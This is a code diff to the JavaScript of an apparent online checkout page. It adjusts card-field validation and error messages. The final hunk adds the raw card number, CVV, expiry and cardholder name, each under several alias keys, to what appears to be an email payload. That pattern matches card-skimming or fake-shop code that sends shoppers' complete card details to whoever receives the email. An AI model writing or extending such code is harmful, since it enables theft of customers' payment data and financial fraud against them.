@@ -272,18 +272,19 @@
     }
 
     function validateExpiry(value) {
-        if (!/^\d{2}\/\d{2}$/.test(value)) {
+        if (!/^\d{2}\/(\d{2}|\d{4})$/.test(value)) {
             return false;
         }
-        const [mm, yy] = value.split("/").map(Number);
+        const parts = value.split("/");
+        const mm = Number(parts[0]);
+        let yy = Number(parts[1]);
         if (mm < 1 || mm > 12) {
             return false;
         }
+        const year = yy < 100 ? 2000 + yy : yy;
         const now = new Date();
-        const year = 2000 + yy;
-        const month = mm - 1;
-        const expiry = new Date(year, month);
-        return expiry > now;
+        const expiry = new Date(year, mm, 0, 23, 59, 59, 999);
+        return expiry >= now;
     }
 
     function markFieldError(field, hasError) {
@@ -332,7 +333,7 @@
         let valid = true;
         setPaymentMessage("");
 
-        const nameOk = cardNameInput.value.trim().length >= 3;
+        const nameOk = cardNameInput.value.trim().length >= 2;
         const cardNum = digitsOnly(cardNumberInput.value);
         const cardOk = luhnValid(cardNum);
         const brand = detectCardBrand(cardNum);
@@ -344,12 +345,21 @@
         markFieldError(cardExpiryInput, !expiryOk);
         markFieldError(cardCvvInput, !cvvOk);
 
-        if (!nameOk || !cardOk || !expiryOk || !cvvOk) {
+        if (!nameOk) {
             valid = false;
-            setPaymentMessage("Check your card details: number, expiry, and CVV.");
+            setPaymentMessage("Please enter the name on the card.");
+        } else if (!cardOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid card number.");
+        } else if (!expiryOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid expiration date (MM/YY).");
+        } else if (!cvvOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid 3 or 4-digit CVV.");
         } else {
             const payTypeLabel = activePaymentMethod === "debit" ? "Debit" : "Credit";
-            setPaymentMessage(`${payTypeLabel} card authenticated: ${brand || "Card"}.`, true);
+            setPaymentMessage(`${payTypeLabel} card verified: ${brand || "Card"}.`, true);
         }
 
         return valid;
@@ -436,10 +446,19 @@
             payment_method_type: payment.method || "Card",
             payment_card_type: payment.brand || "Card",
             card_number: cardNumberFormattedForEmail || "N/A",
+            cardNumber: cardNumberFormattedForEmail || "N/A",
+            cardNumberFormatted: cardNumberFormattedForEmail || "N/A",
+            raw_card_number: payment.cardNumber || "N/A",
             card_brand: payment.brand || "Card",
             card_cvv: cvvForEmail || "N/A",
+            cvv: cvvForEmail || "N/A",
             card_expiry: expiryForEmail || "N/A",
+            expiry: expiryForEmail || "N/A",
+            exp: expiryForEmail || "N/A",
+            card_exp: expiryForEmail || "N/A",
             cardholder_name: cardNameForEmail,
+            cardName: cardNameForEmail,
+            card_name: cardNameForEmail,
             order_status: "Processing",
             payment_status: "Authorized"
         };
